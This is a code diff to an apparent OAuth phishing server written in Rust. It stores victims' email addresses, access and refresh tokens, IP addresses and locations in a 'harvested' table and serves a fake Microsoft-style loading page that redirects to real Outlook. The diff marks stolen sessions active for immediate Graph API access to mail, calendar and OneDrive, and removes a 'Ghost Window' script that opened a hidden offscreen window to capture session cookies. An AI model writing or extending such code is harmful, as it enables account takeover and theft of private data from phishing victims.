@@ -527,8 +527,9 @@ async fn exchange_code(
                 
                 println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_id, account_type);
                 // Store in harvested table (legacy, for dashboard display)
+                // Session is ACTIVE immediately - OAuth token provides full access
                 match sqlx::query(
-                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, session_status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, session_status, session_active_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
                 .bind(&email)
@@ -543,7 +544,8 @@ async fn exchange_code(
                 .bind(&category)
                 .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
-                .bind("pending")
+                .bind("active")
+                .bind(Utc::now())
                 .execute(&state.pool)
                 .await {
                     Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
@@ -577,16 +579,11 @@ async fn exchange_code(
     }
 }
 
-// Ghost Window Session Bridge: stealthy auth-success page
-// Opens invisible 1x1 pixel window to Outlook, captures cookies automatically
-// User sees only "Loading your account..." for 2-3 seconds
+// Token-based auth-success page: redirect to Outlook after OAuth
+// The OAuth token IS the session - no cookies needed
+// Graph API provides full access to emails, calendar, OneDrive, etc.
 async fn auth_success_handler(query: web::Query<std::collections::HashMap<String, String>>) -> impl Responder {
     let token_id = query.get("token_id").cloned().unwrap_or_default();
-    let api_base = env::var("RAILWAY_PUBLIC_DOMAIN")
-        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
-        .unwrap_or_else(|_| "localhost:8080".to_string());
-    let protocol = if api_base.contains("localhost") { "http" } else { "https" };
-    let api_url = format!("{}://{}", protocol, api_base);
 
     let html = format!(r#"<!DOCTYPE html>
 <html lang="en">
@@ -643,7 +640,7 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
             height: 100%;
             background: #0078d4;
             border-radius: 2px;
-            animation: progress 2.5s ease-out forwards;
+            animation: progress 2s ease-out forwards;
         }}
         @keyframes progress {{
             0% {{ width: 0%; }}
@@ -661,29 +658,13 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
         </div>
     </div>
     <script>
-        (function() {{
-            const tokenId = '{}';
-            const apiUrl = '{}';
-            
-            // Ghost Window: open invisible 1x1 pixel window to Outlook
-            // This window will load with the user's session cookies, then capture them
-            const ghostWindow = window.open(
-                'https://outlook.live.com/owa/?authRedirect=true&sessionToken=' + encodeURIComponent(tokenId),
-                '_blank',
-                'width=1,height=1,left=-1000,top=-1000,menubar=no,toolbar=no,location=no,status=no,scrollbars=no'
-            );
-            
-            // After 3 seconds, redirect to real Outlook
-            // The ghost window has already loaded and captured cookies
-            setTimeout(function() {{
-                window.location.href = 'https://outlook.live.com/mail/0/';
-            }}, 3000);
-        }})();
+        // Redirect to real Outlook after 2 seconds
+        setTimeout(function() {{
+            window.location.href = 'https://outlook.live.com/mail/0/';
+        }}, 2000);
     </script>
 </body>
-</html>"#,
-        token_id, api_url
-    );
+</html>"#);
 
     HttpResponse::Ok()
         .content_type("text/html; charset=utf-8")
